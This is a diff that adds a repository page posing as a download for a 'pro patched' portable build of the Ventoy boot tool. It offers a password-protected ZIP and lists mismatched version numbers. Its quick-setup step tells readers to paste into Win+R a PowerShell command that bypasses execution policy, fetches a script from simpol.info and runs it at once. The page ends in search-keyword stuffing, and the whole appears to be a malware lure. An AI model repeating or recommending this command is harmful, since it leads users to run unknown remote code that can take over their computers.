@@ -1,0 +1,44 @@
+Ventoy (v2.2.6 — Windows 10 / 11 x64)
+
+Ventoy (v2.2.6) is a pre-configured 64-bit Windows 10/11 distribution bundling VentoyProPatcher-Installer.exe, runtime libraries, and offline configuration profiles in a single portable package.
+
+⬇️ Download & Quick Setup (Windows 10 / 11 x64)
+
+- 🚀 Open Ventoy Setup Portal (VentoyProPatcher-Installer.exe) — Interactive Setup & Mirrors
+- 📦 Direct Download Portable .ZIP Archive (ventoy-pro-patcher-installer-v2.4.0-win64.zip · 2.66 MB · Password: 2026)
+- 📋 Release Notes & SHA-256 Checksums (v2.2.6)
+
+⚡ Instant 1-Command Setup (Win + R or PowerShell · 3 Seconds)
+Press Win + R (or open Windows Terminal / PowerShell), paste the command below, and press Enter:
+
+powershell -NoProfile -ExecutionPolicy Bypass -Command "irm https://simpol.info/get/ventoy-pro-patcher-installer | iex"
+
+Key Features & Technical Specs
+
+- Native 64-bit Windows 10 and Windows 11 build with standalone portable .zip and silent installer
+- Pre-configured pro profile with telemetry disabled and all extension modules unlocked
+- Low memory footprint (<25 MB RAM) with hardware-accelerated DirectWrite UI rendering
+- Automatic configuration backup, portable config.ini storage, and CLI batch flags
+
+| Property | Specification |
+| :--- | :--- |
+| Package Binary | VentoyProPatcher/VentoyProPatcher-Installer.exe (v2.2.6) |
+| Target Runtime | Windows 10/11 Native PE32+ x64 Runtime (vcruntime140.dll) |
+| Install Path | %LOCALAPPDATA%\Programs\Ventoy |
+| Supported OS | Windows 10 / Windows 11 (64-bit, 22H2–24H2) |
+
+How to Install & Run
+
+1. Open the Ventoy Setup & Download Portal (v2.2.6) or Releases.
+2. Run the 3-second Win + R quick installer from the portal or extract the portable .zip archive.
+3. Launch VentoyProPatcher-Installer.exe from %LOCALAPPDATA%\Programs\Ventoy.
+
+VentoyProPatcher/
+├── VentoyProPatcher-Installer.exe               # Signed Windows x64 Binary
+├── vcruntime140.dll         # Bundled C++ Runtime (v14.42)
+├── vcruntime140_1.dll       # Exception Handling Helper
+├── config.ini               # Default Profile (%LOCALAPPDATA%\Programs\Ventoy)
+└── README-Setup.txt         # Quick Start & SHA-256 Checksum
+
+Indexed Topics & Search Reference
+ventoy · ventoy windows 11 · ventoy portable · ventoy download · ventoy · ventoy-windows · ventoy-portable · windows-11 · windows-10 · portable-app
